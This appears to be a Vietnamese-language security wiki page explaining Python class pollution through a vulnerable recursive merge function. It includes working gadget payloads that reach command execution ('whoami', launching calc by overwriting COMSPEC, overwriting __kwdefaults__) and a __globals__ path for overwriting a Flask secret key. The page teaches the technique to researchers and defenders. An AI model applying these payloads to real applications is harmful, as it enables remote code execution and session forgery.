# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Ví dụ cơ bản

Thay đổi `__qualname__` thông qua tham chiếu class của một instance sẽ cập nhật class đó cùng các base class có thể thay đổi của nó.<sup>[[1]](#references)</sup>

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Ví dụ về lỗ hổng cơ bản

Một thao tác merge đệ quy có thể chấp nhận các khóa mapping do kẻ tấn công kiểm soát và ghi các giá trị lồng nhau thông qua truy cập item hoặc attribute.<sup>[[1]](#references)</sup>

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


USER_INPUT = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
    }
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Ví dụ về Gadget

<details>

<summary>Tạo giá trị mặc định cho thuộc tính của class để dẫn đến RCE (subprocess)</summary>

Một base class dùng chung có thể cung cấp thuộc tính mặc định được gadget lệnh của một sibling class sử dụng.<sup>[[1]](#references)</sup>

```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

USER_INPUT = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```

</details>

<details>

<summary>Làm nhiễm bẩn các class khác và biến toàn cục thông qua <code>globals</code></summary>

Ánh xạ `__globals__` của một hàm cho phép truy cập namespace của module từ một method được định nghĩa trong module đó.<sup>[[1]](#references)[[4]](#references)</sup>

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```

</details>

<details>

<summary>Thực thi subprocess tùy ý</summary>

Trên Windows, `Popen(..., shell=True)` sử dụng biến môi trường `COMSPEC` làm shell mặc định, vì vậy gadget này minh họa việc chuyển hướng lệnh thông qua môi trường.<sup>[[1]](#references)[[5]](#references)</sup>

```python
import subprocess, json

class Employee:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```

</details>

<details>

<summary>Ghi đè <strong><code>__kwdefaults__</code></strong></summary>

Python mô tả `__kwdefaults__` là ánh xạ các giá trị mặc định cho những tham số chỉ nhận đối số từ khóa, đứng sau `*` hoặc `*args` trong định nghĩa hàm.<sup>[[4]](#references)</sup> Gadget sau ghi đè ánh xạ đó thông qua một đường dẫn hàm bị nhiễm độc.<sup>[[1]](#references)</sup>

```python
from os import system
import json

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Employee:
    def __init__(self):
        pass

def execute(*, command='whoami'):
    print(f'Executing {command}')
    system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```

</details>

<details>

<summary>Ghi đè secret của Flask giữa các file</summary>

Nếu class của đối tượng bị ô nhiễm nằm trong module khác với module entry-point của ứng dụng, `__globals__` của các phương thức ban đầu sẽ hiển thị namespace của module chứa class. Sau đó, có thể duyệt qua loader và `sys.modules.__main__` để truy cập module entry-point và đối tượng `app` của Flask.<sup>[[1]](#references)[[2]](#references)</sup>

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

Flask dùng `app.secret_key` để ký session cookie; biết khóa này cho phép kẻ tấn công tạo dữ liệu phiên hợp lệ.<sup>[[6]](#references)</sup>

Bài writeup gốc trình bày đường dẫn sau để truy cập `app.secret_key`; CTFtime cũng lưu trữ một bản sao của bài writeup.<sup>[[2]](#references)[[3]](#references)</sup>

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Thay đổi key có thể cho phép ký session cookie thay thế và có thể dẫn đến leo thang đặc quyền; xem [trang công cụ session Flask](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Cũng xem trang sau để biết thêm các read-only gadget:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution trong Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [Bài viết lời giải task manager idekCTF 2022 (bản gốc)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - Bài viết lời giải task manager idekCTF 2022](https://ctftime.org/writeup/36082)
- [4] [inspect — Kiểm tra các đối tượng đang hoạt động](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Quản lý subprocess](https://docs.python.org/3/library/subprocess.html)
- [6] [Hướng dẫn nhanh — Tài liệu Flask](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
